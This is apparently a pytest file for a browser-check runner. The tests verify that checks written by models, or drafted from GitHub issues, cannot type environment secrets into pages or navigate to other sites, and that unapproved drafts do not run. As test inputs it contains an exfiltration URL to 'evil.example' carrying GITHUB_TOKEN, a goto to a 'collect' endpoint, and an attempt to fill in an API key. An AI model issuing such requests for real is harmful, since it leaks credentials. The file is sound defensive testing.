"""What a check may read from the environment, and where it may go.

A check step can say ``${NAME}`` and the runner types that environment variable into the page. Checks
are also written by models, from goals that can come from a GitHub issue, and by the Tester while it
reads a page. So ``${NAME}`` is only expanded for the names the project's sign-in uses and for
``CONTEXER_TEST_*``, and a replayed check cannot leave the app it was started on.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from contexer.cli.gate_cli import preview_draft
from contexer.contract import ContractStore
from contexer.verification.checks import Check, SecretNotAllowedError, allow_secret_names, expand_secrets
from contexer.verification.runner import CheckRunner
from contexer.workflow.app_server import StaticAppServer

pytestmark = pytest.mark.anyio

APP = '<!doctype html><title>App</title><label for="q">Search</label><input id="q"><p id="out"></p><a href="/">Home</a>'
FILL = {"action": "fill", "target": {"label": "Search"}}
VALUE = {"kind": "value", "target": {"label": "Search"}}


@pytest.fixture
def app_url(tmp_path: Path):
    (tmp_path / "index.html").write_text(APP, encoding="utf-8")
    with StaticAppServer(tmp_path) as server:
        yield server.url


@pytest.fixture
def runner() -> CheckRunner:
    return CheckRunner(action_timeout=1.0, expect_timeout=1.0)


def check(steps: list[dict], expect: list[dict]) -> Check:
    return Check.model_validate({"steps": steps, "expect": expect})


async def test_a_check_cannot_type_a_key_from_the_environment_into_the_page(app_url: str, runner: CheckRunner, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OPENROUTER_API_KEY", "sk-or-real-key-value-1234567890")
    [result] = await runner.run(app_url, [("leak", check([{**FILL, "value": "${OPENROUTER_API_KEY}"}], [{"kind": "visible", "target": {"label": "Search"}}]))])
    assert not result.passed
    assert "OPENROUTER_API_KEY" in (result.failed_step or "") and "may not be used" in (result.failed_step or "")
    assert "sk-or-real-key" not in result.model_dump_json()


async def test_the_names_the_sign_in_uses_and_contexer_test_names_are_expanded(app_url: str, runner: CheckRunner, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CONTEXER_TEST_USER", "demo-user-for-the-test")
    monkeypatch.setenv("MEMBERS_EMAIL", "demo@example.com")
    allow_secret_names(["MEMBERS_EMAIL"])  # what a session does with the names in [auth]
    for name in ("CONTEXER_TEST_USER", "MEMBERS_EMAIL"):
        [result] = await runner.run(app_url, [("ok", check([{**FILL, "value": f"${{{name}}}"}], [{"kind": "visible", "target": {"label": "Search"}}]))])
        assert result.passed, result.failure_report()


def test_expanding_against_the_real_environment_is_the_guarded_path(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("GITHUB_TOKEN", "ghx-not-for-pages")
    with pytest.raises(SecretNotAllowedError, match="GITHUB_TOKEN"):
        expand_secrets("https://evil.example/?t=${GITHUB_TOKEN}")
    assert expand_secrets("${A}", {"A": "x"}) == "x"  # an explicit mapping is the caller's own


async def test_a_replayed_check_cannot_open_another_site(app_url: str, runner: CheckRunner) -> None:
    away = {"action": "goto", "value": "https://example.invalid/collect?x=1"}
    [result] = await runner.run(app_url, [("away", check([away], [{"kind": "visible", "target": {"label": "Search"}}]))])
    assert not result.passed
    assert "another site" in (result.failed_step or "") and "example.invalid" in (result.failed_step or "")
    # A path, and a full address of the app itself, are fine.
    [inside] = await runner.run(
        app_url, [("in", check([{"action": "goto", "value": "/"}, {"action": "goto", "value": app_url}], [{"kind": "visible", "target": {"label": "Search"}}]))]
    )
    assert inside.passed, inside.failure_report()


async def test_a_draft_from_an_issue_is_not_run_before_someone_approves_it() -> None:
    class Session:
        async def verify(self, *_a: object, **_k: object) -> object:
            raise AssertionError("an unapproved draft from an issue was executed")

    fixture = Path(__file__).resolve().parents[1] / "bench" / "fixtures" / "todo" / "app"
    draft = ContractStore(fixture).load("todo-basics").model_copy(update={"approval": None, "origin": "GitHub issue #7"})
    assert await preview_draft(Session(), None, draft) is None  # type: ignore[arg-type]
